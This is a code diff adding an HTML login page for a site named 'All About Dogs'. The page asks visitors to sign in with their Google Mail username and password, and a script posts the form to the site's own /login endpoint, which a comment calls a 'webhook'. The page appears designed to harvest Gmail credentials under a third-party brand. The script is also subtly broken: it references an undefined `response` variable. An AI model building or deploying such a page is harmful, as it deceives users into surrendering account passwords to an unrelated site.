@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - All About Dogs</title>
+    <link rel="stylesheet" href="static/styles.css">
+    <link rel="icon" href="static/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <header>
+        <h1>Login</h1>
+        <h3>Login using your Google Mail Account</h3>
+    </header>
+    <main>
+        <section class="section">
+            <form id="loginForm" action="/login" method="POST" class="login-form">
+                <label for="username">Username/E-mail:</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username or e-mail" required>
+                <br>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                <br>
+                <button type="submit">Login</button>
+            </form>
+            <p id="message"></p>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 All About Dogs. All Rights Reserved.</p>
+    </footer>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            const formData = new FormData(this);
+            const message = document.getElementById('message');
+
+            // Send login request to webhook
+            fetch(this.action, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    message.textContent = data.message;
+                    message.style.color = response.status === 200 ? 'green' : 'red';  // Check response status for color
+                })
+                .catch(() => {
+                    message.textContent = 'Error connecting to server.';
+                    message.style.color = 'red';
+                });
+        });
+
+    </script>
+</body>
+
+</html>
